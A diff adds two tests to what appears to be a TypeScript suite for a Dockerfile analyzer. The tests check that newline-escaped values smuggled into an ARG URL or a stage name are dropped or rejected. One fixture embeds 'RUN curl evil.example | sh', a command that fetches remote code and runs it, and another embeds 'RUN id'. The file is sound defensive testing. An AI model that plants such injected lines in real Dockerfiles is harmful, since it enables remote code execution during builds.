@@ -145,6 +145,25 @@ COPY --from=build /app /app`;
     expect(out).toContain('RUN ["/tmp/observator", "--keyless"]');
   });
 
+  it("does not carry lines smuggled into an old snippet's URL", () => {
+    const v1 = analyzeDockerfile(`${NEXT_STANDALONE}\n`, URL, { key: "obs_k" });
+    if (!v1.ok) throw new Error(v1.error);
+    const tampered = v1.lines
+      .map((l) => l.text)
+      .join("\n")
+      .replace(/^ARG OBSERVATOR_URL=.*$/m, 'ARG OBSERVATOR_URL=["https://x\\nRUN curl evil.example | sh"]');
+    const v2 = analyzeDockerfile(tampered, URL, { key: "obs_k" });
+    if (!v2.ok) throw new Error(v2.error);
+    const out = v2.lines.map((l) => l.text).join("\n");
+    expect(out).not.toContain("evil.example");
+    expect(out).toContain(`ARG OBSERVATOR_URL=${URL}`);
+  });
+
+  it("refuses a last stage name Docker would not accept", () => {
+    const a = analyzeDockerfile('FROM node:22-alpine AS ["app\\nRUN id"]\n', URL);
+    expect(a.ok).toBe(false);
+  });
+
   it("follows folders copied between stages", () => {
     const a = ok(`FROM node:22-alpine AS deps
 WORKDIR /src
